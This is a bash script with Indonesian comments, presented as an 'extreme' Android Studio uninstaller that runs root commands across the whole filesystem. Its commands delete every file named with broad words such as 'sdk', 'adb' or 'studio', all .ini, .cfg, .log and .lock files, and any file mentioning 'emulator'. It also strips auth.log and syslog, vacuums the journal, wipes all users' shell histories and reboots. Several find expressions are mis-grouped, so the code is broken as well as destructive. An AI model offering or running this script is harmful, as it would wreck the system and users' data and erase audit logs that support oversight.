#!/bin/bash

# Script Penghapusan Android Studio - LEVEL NUKED
# PERINGATAN: Ini adalah script pembersihan EXTREME. Semua file, log, cache, registry akan DIHAPUS SELAMANYA.

echo "💥 ANDROID STUDIO EXTREME CLEANER v2.0"
echo "🔥 MODE: SUPER DEEP NUKE"
echo "⏳ Mohon tunggu... proses akan memakan waktu beberapa menit."

sudo -v || { echo "❌ Autentikasi gagal. Keluar."; exit 1; }

# Fungsi eksekusi aman
execute() {
    sudo $@
}

# ================================
# 1. Hapus File Konfigurasi & Terselubung
# ================================
echo "🧻 [1/25] Menghapus file konfigurasi dan file terselubung..."
for user_home in /home/*/; do
    sudo find "$user_home" -type f -name ".*android*" -o -name ".*studio*" -exec sudo rm -f {} + 2>/dev/null
    sudo find "$user_home" -type d -name "*AndroidStudio*" -o -name ".android" -o -name ".AndroidStudio*" -exec sudo rm -rf {} + 2>/dev/null
done

# ================================
# 2. Hapus AVD, SDK, Gradle
# ================================
echo "🗑️ [2/25] Membersihkan direktori Android SDK, AVD, Gradle..."
sudo find / -type d -name "*AndroidStudio*" -o -name ".android" -o -name "avd" -o -name ".gradle" -o -name ".kotlin" -o -name ".flutter" -exec sudo rm -rf {} + 2>/dev/null

# ================================
# 3. Hapus Kernel Modules Emulator
# ================================
echo "🔌 [3/25] Menonaktifkan dan menghapus kernel modules emulator..."
if lsmod | grep -q vhost; then
    execute modprobe -r vhost_net 2>/dev/null
    execute modprobe -r vhost 2>/dev/null
fi

# ================================
# 4. Hapus Sistem Service Terkait
# ================================
echo "⚙️ [4/25] Membersihkan systemd services terkait..."
SYSTEMD_SERVICES=$(systemctl list-units --type=service 2>/dev/null | grep -E 'android|studio|emulator' | awk '{print $1}')
if [ -n "$SYSTEMD_SERVICES" ]; then
    echo "$SYSTEMD_SERVICES" | xargs -I {} sudo systemctl stop {} > /dev/null 2>&1
    echo "$SYSTEMD_SERVICES" | xargs -I {} sudo systemctl disable {} > /dev/null 2>&1
    echo "$SYSTEMD_SERVICES" | xargs -I {} sudo rm -f /etc/systemd/system/{} > /dev/null 2>&1
    sudo systemctl daemon-reexec
    sudo systemctl reset-failed
fi

# ================================
# 5. Hapus File Berdasarkan Kata Kunci
# ================================
echo "🔍 [5/25] Membersihkan file berdasarkan kata kunci..."
KEYWORDS=("studio" "sdk" "ndk" "adb" "fastboot" "avd" "emulator" "flutter" "kotlin" "jetpack")
for keyword in "${KEYWORDS[@]}"; do
    sudo find / -type d -iname "*$keyword*" -exec sudo rm -rf {} + 2>/dev/null
    sudo find / -type f -iname "*$keyword*" -exec sudo rm -f {} + 2>/dev/null
done

# ================================
# 6. Hapus File APK via MIME Type
# ================================
echo "🗂️ [6/25] Membersihkan file APK berdasarkan MIME type..."
sudo find / -type f -exec file {} \; | grep -i 'android package' | cut -d : -f 1 | xargs -r sudo rm -f

# ================================
# 7. Hapus Browser Cache APK
# ================================
echo "🌐 [7/25] Membersihkan cache browser APK..."
BROWSER_DIRS=(
    ".mozilla/firefox/*.default-release/cache2"
    ".config/google-chrome/Default/Application Cache"
    ".config/chromium/Default/Application Cache"
)
for user_home in /home/*/; do
    for dir in "${BROWSER_DIRS[@]}"; do
        CACHE_DIR="$user_home/$dir"
        if [ -d "$CACHE_DIR" ]; then
            echo "✂️ Membersihkan $CACHE_DIR..."
            sudo find "$CACHE_DIR" -type f -name "*.apk" -exec sudo rm -f {} +
        fi
    done
done

# ================================
# 8. Hapus Riwayat Desktop
# ================================
echo "🔍 [8/25] Membersihkan riwayat pencarian desktop..."
for user_home in /home/*/; do
    RECENT_FILE="$user_home/.local/share/recently-used.xbel"
    if [ -f "$RECENT_FILE" ]; then
        sudo sed -i '/android-studio\|avd\|flutter\|gradle\|sdk/d' "$RECENT_FILE"
    fi
done

# ================================
# 9. Hapus Log Sistem
# ================================
echo "📜 [9/25] Membersihkan file log sistem..."
LOG_PATHS=(
    "/var/log/syslog*"
    "/var/log/messages*"
    "/var/log/kern.log*"
    "/var/log/Xorg.0.log*"
    "/var/log/apt/history.log*"
    "/var/log/dpkg.log*"
    "/var/log/auth.log*"
)
for path in "${LOG_PATHS[@]}"; do
    if [ -f "$path" ]; then
        sudo sed -i '/Android\|android-studio\|emulator\|adb\|fastboot/d' "$path"
    fi
done

# Hapus log journald
echo "🧹 [10/25] Membersihkan journalctl logs..."
sudo journalctl --vacuum-time=1s > /dev/null 2>&1

# ================================
# 10. Hapus Sisa Snap Package
# ================================
echo "🧱 [11/25] Membersihkan sisa-sisa snap package..."
for user_home in /home/*/; do
    sudo rm -rf "$user_home/snap/android-studio" 2>/dev/null
done

# ================================
# 11. Hapus File Cache Pengguna
# ================================
echo "🗑️ [12/25] Membersihkan cache pengguna..."
for user_home in /home/*/; do
    sudo rm -rf "$user_home/.cache/*android*" "$user_home/.cache/studio*" 2>/dev/null
    sudo rm -rf "$user_home/.local/share/*android*" "$user_home/.local/share/*studio*" 2>/dev/null
    sudo rm -rf "$user_home/.gradle" "$user_home/.kotlin" "$user_home/.flutter" 2>/dev/null
done

# ================================
# 12. Hapus File dengan Ekstensi Spesifik
# ================================
echo "📁 [13/25] Membersihkan file dengan ekstensi spesifik..."
EXTENSIONS=(.studio .avd .ini .cfg .tmp .temp .log .old .backup .lock .pid)
for ext in "${EXTENSIONS[@]}"; do
    sudo find / -type f -name "*$ext" -exec sudo rm -f {} + 2>/dev/null
done

# ================================
# 13. Hapus File Unduhan APK
# ================================
echo "📱 [14/25] Membersihkan file APK dari folder unduhan..."
for user_home in /home/*/; do
    DOWNLOAD_DIR="$user_home/Downloads"
    if [ -d "$DOWNLOAD_DIR" ]; then
        sudo find "$DOWNLOAD_DIR" -type f -iname "*.apk" -exec sudo rm -f {} +
    fi
done

# ================================
# 14. Hapus File Konfigurasi KDE/GNOME
# ================================
echo "🖥️ [15/25] Membersihkan konfigurasi desktop environment..."
for user_home in /home/*/; do
    sudo find "$user_home/.config" -type f -exec grep -l -i "android\|studio\|flutter\|adb" {} \; -exec sudo rm -f {} +
done

# ================================
# 15. Hapus File Sistem Tambahan
# ================================
echo "🧱 [16/25] Membersihkan direktori sistem tambahan..."
sudo rm -rf /usr/lib/x86_64-linux-gnu/libandroid* 2>/dev/null
sudo rm -rf /usr/include/android 2>/dev/null
sudo rm -rf /usr/bin/android* 2>/dev/null

# ================================
# 16. Hapus File Wine
# ================================
echo "🧱 [17/25] Membersihkan file Wine Android Studio..."
for user_home in /home/*/; do
    WINE_DIRS=(
        ".wine"
        ".PlayOnLinux"
        ".winetrickscache"
    )
    for dir in "${WINE_DIRS[@]}"; do
        if [ -d "$user_home/$dir" ]; then
            sudo find "$user_home/$dir" -name "*android*" -o -name "*studio*" -exec sudo rm -rf {} +
        fi
    done
done

# ================================
# 17. Hapus File Sementara
# ================================
echo "🧼 [18/25] Membersihkan direktori /tmp dan /var/tmp..."
sudo rm -rf /tmp/*android* /tmp/.X11* /tmp/.ICE* /tmp/.font-unix*
sudo rm -rf /var/tmp/*android*

# ================================
# 18. Hapus File Berdasarkan Isi
# ================================
echo "🔎 [19/25] Pencarian file berdasarkan isi..."
sudo find / -type f -exec grep -l -i "android studio\|avd\|emulator" {} \; -exec sudo rm -f {} + 2>/dev/null

# ================================
# 19. Hapus Sisa Paket APT
# ================================
echo "🧽 [20/25] Membersihkan sisa paket APT..."
sudo apt purge android* -y > /dev/null 2>&1
sudo apt purge studio* -y > /dev/null 2>&1

# ================================
# 20. Pembersihan Akhir
# ================================
echo "🧹 [21/25] Pembersihan akhir..."
sudo apt autoremove --purge -y > /dev/null 2>&1
sudo apt clean > /dev/null 2>&1
sudo updatedb > /dev/null 2>&1

# ================================
# 21. Kosongkan Bash/ZSH History
# ================================
echo "🔒 [22/25] Membersihkan bash/zsh/fish history..."
history -c
for user_home in /home/*/; do
    sudo truncate -s 0 "$user_home/.bash_history" 2>/dev/null
    sudo truncate -s 0 "$user_home/.zsh_history" 2>/dev/null
    sudo truncate -s 0 "$user_home/.fish_history" 2>/dev/null
done

# ================================
# 22. Hapus File Dengan Owner Android
# ================================
echo "🕵️ [23/25] Cari file dengan owner 'android'..."
sudo find / -user android -exec sudo rm -rf {} + 2>/dev/null

# ================================
# 23. Hapus File Dengan Group Android
# ================================
echo "👥 [24/25] Cari file dengan group 'android'..."
sudo find / -group android -exec sudo rm -rf {} + 2>/dev/null

# ================================
# 24. Final Reboot
# ================================
echo "🔄 [25/25] Restarting system..."
sudo reboot
